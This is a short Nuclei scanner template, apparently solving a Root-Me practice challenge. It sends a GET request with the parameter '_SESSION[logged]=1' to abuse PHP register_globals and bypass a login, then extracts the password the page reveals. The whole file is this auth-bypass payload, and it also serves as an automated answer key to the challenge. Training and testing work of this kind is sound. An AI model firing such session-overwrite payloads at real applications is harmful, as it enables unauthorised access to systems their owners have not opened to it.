id: PHP-Registerglobals

info:
  name: PHP - Register globals
  author: Tomitom13
  severity: unknown
  tags: php,rootme

requests:
  - method: GET
    path:
      - "{{BaseURL}}/?_SESSION[logged]=1"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "validate with the password : "
        part: body

    extractors:
      - type: regex
        name: password
        part: body
        regex:
          - "password : [a-zA-Z0-9!@#$%^&*()_+\\-,.<>?]+"
